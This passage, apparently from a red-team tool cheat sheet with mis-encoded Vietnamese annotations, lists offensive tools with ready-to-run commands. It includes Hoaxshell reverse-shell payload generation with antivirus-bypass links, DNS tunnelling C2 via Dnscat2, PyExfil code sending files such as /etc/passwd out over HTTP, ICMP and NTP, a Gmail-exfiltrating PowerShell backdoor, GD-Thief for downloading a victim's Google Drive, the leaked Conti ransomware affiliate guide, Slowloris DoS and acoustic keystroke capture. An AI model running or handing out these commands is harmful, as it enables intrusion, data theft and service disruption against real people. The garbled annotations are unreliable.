# Payload that utilizes Invoke-Expression (default)
sudo python3 hoaxshell.py -s <your_ip>

# Payload that writes and executes commands from a file
sudo python3 hoaxshell.py -s <your_ip> -x "C:\Users\\\$env:USERNAME\.local\hack.ps1"

# Encrypted shell session with a trusted certificate
sudo python3 hoaxshell.py -s <your.domain.com> -t -c </path/to/cert.pem> -k <path/to/key.pem>
```
**LÆ°u Ã½:** Cháº¡y **script Python hoaxshell.py** trÃªn mÃ¡y attacker. `-s` lÃ  Ä‘á»‹a chá»‰ IP hoáº·c domain cá»§a attacker mÃ  shell sáº½ káº¿t ná»‘i vá». `-x` chá»‰ Ä‘á»‹nh má»™t Ä‘Æ°á»ng dáº«n file trÃªn mÃ¡y náº¡n nhÃ¢n Ä‘á»ƒ ghi lá»‡nh vÃ o trÆ°á»›c khi thá»±c thi (ká»¹ thuáº­t "drop and run"). `-t` báº­t **TLS/HTTPS** vÃ  cáº§n chá»‰ Ä‘á»‹nh file certificate (`-c`) vÃ  private key (`-k`). Output cá»§a **Hoaxshell** lÃ  payload **PowerShell** cáº§n cháº¡y trÃªn mÃ¡y **Windows** náº¡n nhÃ¢n.

Full usage documentation [táº¡i Ä‘Ã¢y](https://github.com/t3l3machus/hoaxshell#usage).

[Usage Demo - YouTube](https://www.youtube.com/watch?v=SEufgD5UxdU)

[**Hoaxshell** vs AV](https://github.com/t3l3machus/hoaxshell#av-bypass-pocs)

![image](https://user-images.githubusercontent.com/100603074/229649767-817d838c-891d-4a33-b494-9249f3a2f404.png)

*Image used from https://github.com/t3l3machus/hoaxshell*

**Exfiltration**
====================

### [ğŸ”™](#tool-list)[**Dnscat2**](https://github.com/iagox86/dnscat2)

A tool for establishing **C2 connections** via DNS, even if the attacker and victim machines are behind a firewall / network address translation (**NAT**).

The tool is designed to be stealthy and difficult to detect, as it uses legitimate **DNS traffic** to transmit data.

**Install (Compile - Server):**

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
gem install bundler
bundle install
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t **Dnscat2 Server**. Clone mÃ£ nguá»“n (cÃ´ng cá»¥ Ä‘Æ°á»£c viáº¿t báº±ng **Ruby**), di chuyá»ƒn vÃ o thÆ° má»¥c server vÃ  cÃ i Ä‘áº·t cÃ¡c gem **Ruby** cáº§n thiáº¿t báº±ng **bundler**. YÃªu cáº§u mÃ´i trÆ°á»ng **Ruby** vÃ  **Bundler**. Cháº¡y trÃªn mÃ¡y attacker.

**Install (Compile - Client):**

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client/
make
```
**LÆ°u Ã½:** BiÃªn dá»‹ch client **Dnscat2**. Client Ä‘Æ°á»£c viáº¿t báº±ng **C**.

Full installation information can be found in the [Installation Section](https://github.com/iagox86/dnscat2#compiling).

**CÃ¡ch sá»­ dá»¥ng (Server):**

```bash
# Establish the server
ruby ./dnscat2.rb DOMAIN.COM
```
**LÆ°u Ã½:** Cháº¡y **Dnscat2 Server** vá»›i tÃªn miá»n sáº½ Ä‘Æ°á»£c sá»­ dá»¥ng cho **DNS tunneling** (`DOMAIN.COM`). Cáº§n cáº¥u hÃ¬nh báº£n ghi NS cá»§a `DOMAIN.COM` Ä‘á»ƒ trá» Ä‘áº¿n IP cá»§a **Dnscat2 Server** hoáº·c dÃ¹ng tÃ¹y chá»n `--no-canary` náº¿u khÃ´ng cÃ³ tÃªn miá»n tÃ¹y chá»‰nh.

**CÃ¡ch sá»­ dá»¥ng (Client):**

```bash
# Establish the client with authoritative domain
./dnscat2 DOMAIN.COM

# Establish the client without authoritative domain
./dnscat2 --dns host=0.0.0.0,port=0000

# Ping the server from the client
./dnscat --ping DOMAIN.COM

# Ping the server from the client, with custom dns resolver ip
./dnscat --dns server=0.0.0.0,domain=DOMAIN.COM --ping
```
**LÆ°u Ã½:** Cháº¡y client **Dnscat2** trÃªn mÃ¡y náº¡n nhÃ¢n. NÃ³ sáº½ cá»‘ gáº¯ng káº¿t ná»‘i Ä‘áº¿n server thÃ´ng qua cÃ¡c truy váº¥n **DNS** qua **resolver** máº·c Ä‘á»‹nh hoáº·c tÃ¹y chá»‰nh. Ká»¹ thuáº­t **DNS tunneling** áº©n dá»¯ liá»‡u trong cÃ¡c báº£n ghi DNS.

**CÃ¡ch sá»­ dá»¥ng (Tunnels):**

```bash
# (After establishing the client) You can open a new tunnelled port
listen [lhost:]lport rhost:rport

# Forward ssh connections through the dnscat2 client to an internal device
listen 127.0.0.1:2222 10.10.10.10:22
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh nÃ y Ä‘Æ°á»£c sá»­ dá»¥ng bÃªn trong phiÃªn shell **Dnscat2**. NÃ³ cho phÃ©p thiáº¿t láº­p cÃ¡c tunnel TCP hoáº·c UDP qua **kÃªnh C2 DNS**. Lá»‡nh `listen` thiáº¿t láº­p má»™t listener cá»¥c bá»™ trÃªn mÃ¡y attacker vÃ  chuyá»ƒn tiáº¿p lÆ°u lÆ°á»£ng qua tunnel Ä‘áº¿n Ä‘á»‹a chá»‰ IP vÃ  cá»•ng bÃªn trong máº¡ng náº¡n nhÃ¢n.

Full usage information can be found in the [Usage Section](https://github.com/iagox86/dnscat2#usage).

![image](https://user-images.githubusercontent.com/100603074/210116521-0ef905ec-cc14-4cdc-9831-46bbded8c6af.png)

### [ğŸ”™](#tool-list)[**Cloakify**](https://github.com/TryCatchHCF/Cloakify)

When **exfiltrating victim files**, DLP (Data Loss Prevention) solutions will typically trigger on strings within these files. **Cloakify** reduces this risk by transforming the data.

**Cloakify** transforms any filetype (e.g. **.zip, .exe, .xls**, etc.) into a list of harmless-looking strings. This lets you hide the file in plain sight, and transfer the file without triggering alerts.

**Note:** You can make your own ciphers, see [táº¡i Ä‘Ã¢y](https://github.com/TryCatchHCF/Cloakify#create-your-own-cipers) for more info.

**Install:**

```bash
git clone https://github.com/TryCatchHCF/Cloakify
```
**LÆ°u Ã½:** Táº£i mÃ£ nguá»“n báº±ng **Git**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Cloakify some text
python3 cloakify.py TEXT.txt ciphers/desserts.ciph > TEXT.cloaked

# De-Cloakify the text
python3 decloakify.py TEXT.cloaked ciphers/desserts.ciph
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ sá»­ dá»¥ng **script Python cloakify.py** vÃ  **decloakify.py**. Báº¡n cung cáº¥p file input (`TEXT.txt`), má»™t file "cipher" (`ciphers/desserts.ciph` chá»©a danh sÃ¡ch cÃ¡c chuá»—i sáº½ dÃ¹ng Ä‘á»ƒ mÃ£ hÃ³a dá»¯ liá»‡u) vÃ  cÃ´ng cá»¥ sáº½ output ra file chá»©a dá»¯ liá»‡u Ä‘Ã£ bá»‹ **cloakified** (`TEXT.cloaked`). Äá»ƒ giáº£i mÃ£, báº¡n sá»­ dá»¥ng **decloakify.py** vá»›i file **cloakified** vÃ  file cipher tÆ°Æ¡ng á»©ng. File cipher chá»©a má»™t danh sÃ¡ch cÃ¡c chuá»—i "vÃ´ háº¡i" nhÆ° tÃªn mÃ³n trÃ¡ng miá»‡ng, tÃªn bÃ i hÃ¡t, dÃ²ng thÆ¡,...

![image](https://user-images.githubusercontent.com/100603074/210117067-4611a42a-2ac7-44af-8aee-2e448c05909b.png)

![image](https://user-images.githubusercontent.com/100603074/210116996-8ec36a12-8eef-44e9-924a-ad179e599910.png)

### [ğŸ”™](#tool-list)[**PyExfil**](https://github.com/ytisf/PyExfil)

"An Alpha-Alpha stage package, not yet tested (and will appreciate any feedbacks and commits) designed to show several techniques of data exfiltration is real-world scenarios."
**LÆ°u Ã½:** ÄÃ¢y lÃ  má»™t **package Python** thá»ƒ hiá»‡n nhiá»u ká»¹ thuáº­t **data exfiltration** khÃ¡c nhau. Tá»± nháº­n lÃ  Ä‘ang á»Ÿ giai Ä‘oáº¡n phÃ¡t triá»ƒn ban Ä‘áº§u (Alpha-Alpha stage).

**Install:**

```bash
git clone https://www.github.com/ytisf/PyExfil;cd PyExfil;pip install -r requirements.txt;pip install py2exe;pip setup.py install
```
**LÆ°u Ã½:** Táº£i mÃ£ nguá»“n, cÃ i Ä‘áº·t cÃ¡c thÆ° viá»‡n Python cáº§n thiáº¿t vÃ  sá»­ dá»¥ng **`setup.py install`** Ä‘á»ƒ cÃ i Ä‘áº·t package. **`pip install py2exe`** cÃ³ thá»ƒ dÃ¹ng Ä‘á»ƒ táº¡o file thá»±c thi cho Windows.

**CÃ¡ch sá»­ dá»¥ng:** (Full Usage [táº¡i Ä‘Ã¢y](https://github.com/ytisf/PyExfil/blob/master/USAGE.md))

#### HTTP Cookies

```python
from pyexfil.network.HTTP_Cookies.http_exfiltration import send_file, listen

# For Client (exfil)
send_file(addr='http://www.morirt.com', file_path=FILE_TO_EXFIL)

# For Server (collecting)
listen(local_addr='127.0.0.1', local_port=80)
```
**LÆ°u Ã½:** VÃ­ dá»¥ sá»­ dá»¥ng **PyExfil** Ä‘á»ƒ **exfiltrate** dá»¯ liá»‡u báº±ng cÃ¡ch nhÃºng chÃºng vÃ o **cookie HTTP**. Báº¡n cáº§n cháº¡y **listener** trÃªn mÃ¡y attacker vÃ  sá»­ dá»¥ng **send_file** trÃªn mÃ¡y náº¡n nhÃ¢n.

#### ICMP Echo 8

```python
from pyexfil.network.ICMP.icmp_exfiltration import send_file, init_listener

# For Client (exfil)
ip_addr = "127.0.0.1"
send_file(ip_addr, src_ip_addr="127.0.0.1", file_path="", max_packetsize=512, SLEEP=0.1)

# For Server (collecting)
init_listener(ip_addr, saving_location="/tmp/")
```
**LÆ°u Ã½:** VÃ­ dá»¥ sá»­ dá»¥ng **PyExfil** Ä‘á»ƒ **exfiltrate** dá»¯ liá»‡u báº±ng cÃ¡ch nhÃºng chÃºng vÃ o gÃ³i tin **ICMP Echo** (gÃ³i tin **ping**). YÃªu cáº§u quyá»n raw socket hoáº·c quyá»n admin trÃªn mÃ¡y gá»­i vÃ  nháº­n Ä‘á»ƒ táº¡o/láº¯ng nghe gÃ³i ICMP.

#### NTP Request

```python
from pyexfil.network.NTP.ntp_exfil import exfiltrate, ntp_listen, NTP_UDP_PORT

# For Client (exfil)
ip_addr = "127.0.0.1"
exfiltrate("/etc/passwd", ip_addr, time_delay=0.1)

# For Server (collecting)
ntp_listener(ip="0.0.0.0", port=NTP_UDP_PORT)
```
**LÆ°u Ã½:** VÃ­ dá»¥ sá»­ dá»¥ng **PyExfil** Ä‘á»ƒ **exfiltrate** dá»¯ liá»‡u báº±ng cÃ¡ch nhÃºng chÃºng vÃ o gÃ³i tin **NTP** (Network Time Protocol).

![image](https://user-images.githubusercontent.com/100603074/206573575-e90384c4-4a39-4f3c-96ec-face1f191808.png)

### [ğŸ”™](#tool-list)[**Powershell RAT**](https://github.com/Viralmaniar/Powershell-RAT)

**Python based backdoor** that uses **Gmail** to **exfiltrate** data as an e-mail attachment. It tracks the user activity using screen capture and sends the information to an attacker as an e-mail attachment.
**LÆ°u Ã½:** **Powershell RAT** thá»±c táº¿ bao gá»“m cáº£ mÃ£ nguá»“n **Python** (server hoáº·c Ä‘iá»u khiá»ƒn) vÃ  mÃ£ nguá»“n **PowerShell** (backdoor/agent cháº¡y trÃªn mÃ¡y náº¡n nhÃ¢n). NÃ³ sá»­ dá»¥ng Gmail lÃ m kÃªnh **exfiltration** báº±ng cÃ¡ch gá»­i email Ä‘Ã­nh kÃ¨m dá»¯ liá»‡u thu tháº­p Ä‘Æ°á»£c.

**Install:**

```bash
git clone https://github.com/Viralmaniar/Powershell-RAT
```
**LÆ°u Ã½:** Táº£i mÃ£ nguá»“n báº±ng **Git**.

**CÃ¡ch sá»­ dá»¥ng:** (Full Usage [táº¡i Ä‘Ã¢y](https://github.com/Viralmaniar/Powershell-RAT/blob/master/README.md))

#### Setup

- Throwaway Gmail address
- Enable "**Allow less secure apps**" by going to https://myaccount.google.com/lesssecureapps
- Modify the `$username` & `$password` variables for your account in the Mail.ps1 Powershell file
- Modify `$msg.From` & `$msg.To.Add` with throwaway gmail address
**LÆ°u Ã½:** Äá»ƒ backdoor **PowerShell** nÃ y hoáº¡t Ä‘á»™ng, báº¡n cáº§n thiáº¿t láº­p má»™t tÃ i khoáº£n Gmail vÃ  cáº¥u hÃ¬nh backdoor vá»›i thÃ´ng tin Ä‘Äƒng nháº­p (tÃªn ngÆ°á»i dÃ¹ng vÃ  máº­t kháº©u) cá»§a tÃ i khoáº£n Gmail Ä‘Ã³ Ä‘á»ƒ nÃ³ cÃ³ thá»ƒ gá»­i email. "Allow less secure apps" cáº§n báº­t Ä‘á»ƒ backdoor cÃ³ thá»ƒ Ä‘Äƒng nháº­p vÃ o Gmail báº±ng máº­t kháº©u Ä‘Æ¡n thuáº§n thay vÃ¬ OAuth/MFA. *Cáº©n tháº­n khi sá»­ dá»¥ng tÃ i khoáº£n Gmail cho má»¥c Ä‘Ã­ch nÃ y.*

![image](https://user-images.githubusercontent.com/100603074/210267906-68a2e852-d7b5-4b61-a747-77844e1d7d99.png)

### [ğŸ”™](#tool-list)[**GD-Thief**](https://github.com/antman1p/GD-Thief)

Tool for **exfiltrating** files from a target's **Google Drive** that you have access to, via Google's API.

This includes all shared files, all files from shared drives, and all files from domain drives that the target has access to.
**LÆ°u Ã½:** CÃ´ng cá»¥ nÃ y táº­p trung vÃ o viá»‡c thu tháº­p dá»¯ liá»‡u tá»« **Google Drive**, lá»£i dá»¥ng quyá»n truy cáº­p tÃ i khoáº£n Google Ä‘Ã£ bá»‹ xÃ¢m nháº­p hoáº·c quyá»n truy cáº­p á»©ng dá»¥ng Ä‘á»‘i vá»›i tÃ i khoáº£n Ä‘Ã³.

**Install:**

```bash
git clone https://github.com/antman1p/GD-Thief.git
cd GD-Thief
pip install --upgrade google-api-python-client google-auth-httplib2 google-auth-oauthlib
```
**LÆ°u Ã½:** Táº£i mÃ£ nguá»“n vÃ  cÃ i Ä‘áº·t cÃ¡c thÆ° viá»‡n **Python** cho viá»‡c tÆ°Æ¡ng tÃ¡c vá»›i Google API.

then...

1. Create a new Google Cloud Platform (GCP) project
2. Enable a **Google Workspace API**
3. Configure **OAuth Consent** screen
4. Create a credential
5. Add the victim's Google account to the Application's Test Users

For detailed setup instructions see the [How To Guide](https://github.com/antman1p/GD-Thief#how-to).
**LÆ°u Ã½:** CÃ¡c bÆ°á»›c thiáº¿t láº­p bÃªn ngoÃ i, cáº¥u hÃ¬nh má»™t dá»± Ã¡n Google Cloud Platform vÃ  OAuth 2.0 Ä‘á»ƒ cÃ´ng cá»¥ cÃ³ thá»ƒ Ä‘Æ°á»£c á»§y quyá»n truy cáº­p dá»¯ liá»‡u Google Drive. QuÃ¡ trÃ¬nh nÃ y phá»©c táº¡p vÃ  yÃªu cáº§u quyá»n truy cáº­p vÃ o cáº£ tÃ i khoáº£n GCP cá»§a attacker vÃ  (ban Ä‘áº§u) sá»± Ä‘á»“ng Ã½ hoáº·c quyá»n cá»§a náº¡n nhÃ¢n.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
usage:
python3 gd_thief.py [-h] -m [{dlAll, dlDict[-d <DICTIONARY FILE PATH>]}
	[-t <THREAD COUNT>]

help:

This Module will connect to Google's API using an access token and exfiltrate files
from a target's **Google Drive**. It will output exfiltrated files to the ./loot directory

arguments:
        -m [{dlAll, dlDict}],
                --mode [{dlAll, dlDict}]
                Cháº¿ Ä‘á»™ táº£i xuá»‘ng file
                CÃ³ thá»ƒ lÃ  "dlAll", "dlDict [-d <DICTIONARY FILE PATH>]", hoáº·c... (ThÃªm tÃ¹y chá»n sáº½ Ä‘áº¿n)

optional arguments:
        -d <DICTIONARY FILE PATH>, --dict <DICTIONARY FILE PATH>
                        ÄÆ°á»ng dáº«n Ä‘áº¿n file dictionary. Báº¯t buá»™c vá»›i cháº¿ Ä‘á»™ táº£i xuá»‘ng "-m, --mode dlDict"
                        Báº¡n cÃ³ thá»ƒ sá»­ dá»¥ng dictionary Ä‘Æ°á»£c cung cáº¥p, vÃ­ dá»¥: "-d ./dictionaries/secrets-keywords.txt"
        -t <THREAD COUNT>, --threads <THREAD COUNT>
                        Sá»‘ luá»“ng. (QuÃ¡ nhiá»u cÃ³ thá»ƒ vÆ°á»£t quÃ¡ giá»›i háº¡n tá»‘c Ä‘á»™ cá»§a Google)

        -h, --help
                Hiá»ƒn thá»‹ thÃ´ng bÃ¡o trá»£ giÃºp vÃ  thoÃ¡t
```
**LÆ°u Ã½:** HÆ°á»›ng dáº«n sá»­ dá»¥ng **script Python gd_thief.py**. CÃ´ng cá»¥ sá»­ dá»¥ng cÃ¡c mode khÃ¡c nhau Ä‘á»ƒ **exfiltrate**. `dlAll` táº£i xuá»‘ng táº¥t cáº£ cÃ¡c file mÃ  tÃ i khoáº£n cÃ³ quyá»n truy cáº­p. `dlDict` táº£i xuá»‘ng cÃ¡c file cÃ³ tÃªn hoáº·c ná»™i dung khá»›p vá»›i cÃ¡c tá»« khÃ³a trong file dictionary. Cáº§n cÃ³ **token truy cáº­p Google API** Ä‘á»ƒ sá»­ dá»¥ng cÃ´ng cá»¥ nÃ y.

Nice [blog post](https://antman1p-30185.medium.com/youre-a-gd-thief-1e02358fd557) explaining the logic behind the tool.

**Impact**
====================

### [ğŸ”™](#tool-list)RÃ² rá»‰ hÆ°á»›ng dáº«n pentester cá»§a **Conti**

**Conti** is a ransomware group that is known for targeting large organizations and using sophisticated tactics to evade detection and maximize the impact of their attacks.

**Conti** has been responsible for a number of high-profile ransomware attacks, including ones against the computer systems of the City of Pensacola, Florida, and the computer systems of the Irish health service.

The [**Conti Pentester Guide Leak - Repository**](https://github.com/ForbiddenProgrammer/conti-pentester-guide-leak) contains leaked pentesting materials given to **Conti ransomware group affiliates**.
**LÆ°u Ã½:** Repository nÃ y khÃ´ng pháº£i lÃ  má»™t **cÃ´ng cá»¥** trá»±c tiáº¿p mÃ  lÃ  má»™t táº­p há»£p tÃ i liá»‡u (Ä‘Ã£ bá»‹ rÃ² rá»‰) mÃ´ táº£ cÃ¡c TTP (**Tactics, Techniques, and Procedures**) vÃ  **cÃ´ng cá»¥** Ä‘Æ°á»£c sá»­ dá»¥ng bá»Ÿi cÃ¡c **affiliate** (chi nhÃ¡nh) cá»§a bÄƒng nhÃ³m **ransomware Conti**. Ráº¥t há»¯u Ã­ch cho má»¥c Ä‘Ã­ch tÃ¬nh bÃ¡o vá» má»‘i Ä‘e dá»a vÃ  phÃ²ng thá»§.

Topics include:

- Configuring **Rclone** with **MEGA** for **data exfiltration**
- Configuring **AnyDesk** as **persistence** and remote access into a victimâ€™s network
- Elevating and gaining admin rights inside a companyâ€™s hacked network
- Taking over **domain controller**s
- Dumping passwords from **Active Directory**
**LÆ°u Ã½:** Danh sÃ¡ch cÃ¡c chá»§ Ä‘á» quan trá»ng trong tÃ i liá»‡u rÃ² rá»‰, bao gá»“m cÃ¡c ká»¹ thuáº­t **exfiltration**, duy trÃ¬ truy cáº­p (**persistence**), nÃ¢ng quyá»n, kiá»ƒm soÃ¡t **domain controller** vÃ  thu tháº­p thÃ´ng tin xÃ¡c thá»±c.

**Note:** *[vx-underground.org](https://www.vx-underground.org/) obtained more training materials and tools used by **Conti ransomware** operators [táº¡i Ä‘Ã¢y](https://share.vx-underground.org/Conti/).*

![image](https://user-images.githubusercontent.com/100603074/210856582-44a9bf16-23d4-4b7e-9e91-8604c3191e78.png)

*Image used from https://github.com/ForbiddenProgrammer/conti-pentester-guide-leak*

### [ğŸ”™](#tool-list)[**SlowLoris**](https://github.com/gkbrk/slowloris)

**Slowloris** is a type of denial-of-service (DoS) attack that involves sending HTTP requests to a web server in a way that ties up the server's resources, preventing it from being able to process legitimate requests.

This attack would typically be conducted with a **botnet**, it is designed to be difficult to detect and mitigate, as it uses a relatively small number of connections and does not generate a large amount of traffic.
**LÆ°u Ã½:** Ká»¹ thuáº­t táº¥n cÃ´ng DoS **Slowloris** khÃ´ng cá»‘ gáº¯ng lÃ m ngáº­p server báº±ng lÆ°u lÆ°á»£ng lá»›n, mÃ  báº±ng cÃ¡ch duy trÃ¬ nhiá»u káº¿t ná»‘i HTTP Ä‘áº¿n server cÃ ng lÃ¢u cÃ ng tá»‘t, khiáº¿n server khÃ´ng cÃ³ Ä‘á»§ tÃ i nguyÃªn Ä‘á»ƒ phá»¥c vá»¥ cÃ¡c káº¿t ná»‘i há»£p phÃ¡p.

**Install (Pip):**

```bash
sudo pip3 install slowloris
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t **cÃ´ng cá»¥ Slowloris** báº±ng pip.

**Install (Git):**

```bash
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
```
**LÆ°u Ã½:** Táº£i mÃ£ nguá»“n.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Pip
slowloris example.com

# Git
python3 slowloris.py example.com
```
**LÆ°u Ã½:** Sá»­ dá»¥ng cÃ´ng cá»¥ Ä‘á»ƒ thá»±c hiá»‡n táº¥n cÃ´ng DoS vÃ o tÃªn miá»n má»¥c tiÃªu (`example.com`). Báº¡n cáº§n thay `example.com` báº±ng má»¥c tiÃªu thá»±c táº¿.

![image](https://user-images.githubusercontent.com/100603074/210115630-b6541ee0-ad82-471a-9a7e-7f0ec028c67d.png)

### [ğŸ”™](#tool-list)[**usbkill**](https://github.com/hephaest0s/usbkill)

This is an **anti-forensic kill-switch** that waits for a change in USB port status, immediately shutting down endpoint if a change is detected.

In some situations, it is imperative that no data is added or removed from an endpoint via USB.

This is where **USBkill** comes in.
**LÆ°u Ã½:** **USBkill** lÃ  má»™t **cÃ´ng cá»¥ chá»‘ng phÃ¡p y** tá»± Ä‘á»™ng kÃ­ch hoáº¡t (thÆ°á»ng lÃ  táº¯t mÃ¡y ngay láº­p tá»©c) khi cÃ³ sá»± thay Ä‘á»•i trÃªn cá»•ng **USB** (vÃ­ dá»¥: cáº¯m hoáº·c rÃºt thiáº¿t bá»‹ USB). Äiá»u nÃ y nháº±m ngÄƒn cháº·n dá»¯ liá»‡u bá»‹ sao chÃ©p ra ngoÃ i hoáº·c bá»‹ Ä‘Æ°a vÃ o báº±ng thiáº¿t bá»‹ USB trong trÆ°á»ng há»£p kháº©n cáº¥p.

**Install:**

```
git clone https://github.com/hephaest0s/usbkill
cd usbkill
./setup.py install
```
**LÆ°u Ã½:** Táº£i mÃ£ nguá»“n vÃ  cÃ i Ä‘áº·t **cÃ´ng cá»¥ Python** báº±ng **`setup.py`**. YÃªu cáº§u cÃ i Ä‘áº·t **Python** vÃ  **Git**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
sudo python3 usbkill.py
```
**LÆ°u Ã½:** Cháº¡y **script Python usbkill.py** vá»›i quyá»n **super user** (`sudo`) vÃ¬ nÃ³ cáº§n quyá»n truy cáº­p vÃ o tráº¡ng thÃ¡i cá»§a cá»•ng **USB**.

![image](https://user-images.githubusercontent.com/100603074/217654429-98efef6d-b70f-48b8-8979-228ce2f78932.png)

*Image used from https://en.wikipedia.org/wiki/USBKill*

### [ğŸ”™](#tool-list)[**Keytap**](https://github.com/ggerganov/kbd-audio)

This is a tool that can guess the pressed keyboard keys from the audio of a computer's microphone.

**Keytap2** can also be used to retrieve text from audio snippets of keyboard typing.
**LÆ°u Ã½:** CÃ´ng cá»¥ nÃ y phÃ¢n tÃ­ch Ã¢m thanh tiáº¿ng gÃµ phÃ­m Ä‘á»ƒ Ä‘oÃ¡n xem cÃ¡c phÃ­m nÃ o Ä‘Ã£ Ä‘Æ°á»£c nháº¥n (side-channel attack). **Keytap2** cÃ³ thá»ƒ lÃ  phiÃªn báº£n cáº£i tiáº¿n hoáº·c pháº§n liÃªn quan.

**Install (Build):**

```
git clone https://github.com/ggerganov/kbd-audio
cd kbd-audio
git submodule update --init
mkdir build && cd build
cmake ..
make
```
**LÆ°u Ã½:** Clone mÃ£ nguá»“n vÃ  cÃ¡c submodule, táº¡o thÆ° má»¥c build, cáº¥u hÃ¬nh dá»± Ã¡n báº±ng **CMake** vÃ  biÃªn dá»‹ch (`make`). YÃªu cáº§u cÃ¡c cÃ´ng cá»¥ build C/C++ (gcc, clang...) vÃ  **CMake**. Cháº¡y trÃªn **Linux/macOS/Windows**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Record audio to a raw binary file on disk
./record-full output.kbd [-cN]

# Playback a recording captured via the record-full tool
./play-full input.kbd [-pN]

# Record audio only while typing (Useful for collecting training data for keytap)
./record output.kbd [-cN] [-CN]
```
**LÆ°u Ã½:** `record-full` ghi Ã¢m thanh Ä‘áº§y Ä‘á»§. `play-full` phÃ¡t láº¡i file Ã¢m thanh Ä‘Ã£ ghi. `record` chá»‰ ghi Ã¢m thanh khi phÃ¡t hiá»‡n gÃµ phÃ­m, há»¯u Ã­ch Ä‘á»ƒ thu tháº­p dá»¯ liá»‡u huáº¥n luyá»‡n. Cá» `-c`/`-p` cÃ³ thá»ƒ liÃªn quan Ä‘áº¿n kÃªnh Ã¢m thanh hoáº·c thiáº¿t bá»‹. Output lÃ  cÃ¡c file `.kbd` thÃ´. Äá»ƒ phÃ¢n tÃ­ch, cáº§n sá»­ dá»¥ng cÃ¡c module khÃ¡c cá»§a **Keytap** (khÃ´ng hiá»ƒn thá»‹ á»Ÿ Ä‘Ã¢y) hoáº·c **Keytap2**.

See full usage documentation [táº¡i Ä‘Ã¢y](https://github.com/ggerganov/kbd-audio#tool-details).

Try the online demo at [https://keytap.ggerganov.com/](https://keytap.ggerganov.com/).

![image](https://user-images.githubusercontent.com/100603074/229649861-728e7ebb-ddb9-4347-9934-dd077d12bb41.png)

*Image used from https://github.com/ggerganov/kbd-audio*


